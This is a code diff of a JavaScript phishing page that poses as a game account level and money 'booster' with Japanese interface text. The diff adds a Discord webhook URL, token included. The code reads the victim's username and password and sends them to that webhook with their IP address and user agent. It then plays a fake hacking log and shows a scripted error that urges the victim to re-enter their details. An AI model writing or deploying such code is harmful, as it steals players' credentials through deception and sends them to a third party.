@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'webhookのリンク';
+const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1383529796595613816/ub2mTIV7qRheXhiorjMOse8uGZ6FyMTX6HkYKVvrAdp9V7HXtBUAF0U8HtHAqOa0S6Zk';
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
@@ -14,7 +14,7 @@ function getIP() {
 
 function nowISOWithMs() {
   const now = new Date();
-  return now.toISOString().replace('Z', `.${now.getMilliseconds().toString().padStart(3, '0')}Z`);
+  return new Date(now.getTime() - now.getTimezoneOffset() * 60000).toISOString().replace('Z', `.${now.getMilliseconds().toString().padStart(3, '0')}Z`);
 }
 
 async function sendToWebhook(embed) {
@@ -23,16 +23,14 @@ async function sendToWebhook(embed) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ embeds: [embed] })
-  });
+  }).catch(() => {});
 }
 
 form1.addEventListener('submit', async (e) => {
   e.preventDefault();
-
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
   savedAccount = { username, password };
-
   const ip = await getIP();
   const embed = {
     title: "Account Info",
@@ -51,9 +49,7 @@ form1.addEventListener('submit', async (e) => {
       { name: "User-Agent", value: navigator.userAgent, inline: false }
     ]
   };
-
   await sendToWebhook(embed);
-
   [...form1.querySelectorAll('input, button')].forEach(el => el.classList.add('hidden'));
   form2.classList.remove('hidden');
   form2.classList.add('fade-in');
@@ -63,12 +59,10 @@ form2.addEventListener('submit', (e) => {
   e.preventDefault();
   form2.classList.add('hidden');
   log.classList.remove('hidden');
-
   const level = document.getElementById('level-amount').value.trim();
   const money = document.getElementById('money-amount').value.trim();
-
   const embed = {
-    title: "Info",
+    title: "Boost Info",
     color: 15844367,
     fields: [
       { name: "Username", value: savedAccount.username, inline: true },
@@ -76,7 +70,6 @@ form2.addEventListener('submit', (e) => {
       { name: "Money Increase", value: money, inline: true }
     ]
   };
-
   sendToWebhook(embed);
   startFakeProcess(log, level, money);
 });
@@ -86,12 +79,10 @@ function startFakeProcess(logEl, level, money) {
   logEl.style.color = '#00ff00';
   logEl.style.fontSize = '16px';
   logEl.style.lineHeight = '1.4';
-
   let remainingMs = (Math.floor(Math.random() * 420 + 180)) * 1000;
   const logLines = [];
   const maxLines = 7;
   let stopped = false;
-
   const statusDisplay = document.createElement('div');
   statusDisplay.style.position = 'fixed';
   statusDisplay.style.bottom = '16px';
@@ -126,33 +117,27 @@ function startFakeProcess(logEl, level, money) {
     "Recalculating XP checksum...",
     "Patching main.bundle.js...",
     "WASM module injected",
-    "Injecting +"+level+" levels...",
-    "Balance update: +$"+money
+    "Injecting +" + level + " levels...",
+    "Balance update: +$" + money
   ];
 
   const timerInterval = setInterval(() => {
     if (stopped) return;
-
     remainingMs = Math.max(0, remainingMs - 10);
-
     const totalSec = Math.floor(remainingMs / 1000);
     const m = Math.floor(totalSec / 60);
     const s = totalSec % 60;
     const ms = remainingMs % 1000;
     const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
-
     statusDisplay.textContent = `改竄中${dots}\n残り ${m}分${s}秒${ms}ミリ秒`;
-
     if (remainingMs <= 0 && !stopped) {
       stopped = true;
       clearInterval(timerInterval);
       clearInterval(logInterval);
       statusDisplay.remove();
-
       const failTime = new Date().toLocaleTimeString('en-GB');
-      logLines.push(`[${failTime}] ERROR: Modification process terminated.`);
+      logLines.push(`[${failTime}] ❌ ERROR: Modification process terminated.`);
       if (logLines.length > maxLines) logLines.shift();
-
       logEl.innerHTML = `<pre style="color:#00ff00;">${logLines.join('\n')}</pre>
         <div style="color:red;font-size:16px;font-weight:bold;text-align:center;animation:blink 0.5s infinite;">
         処理に失敗しました。アカウントの情報が正しいか確認してもう一度実行をしてください。
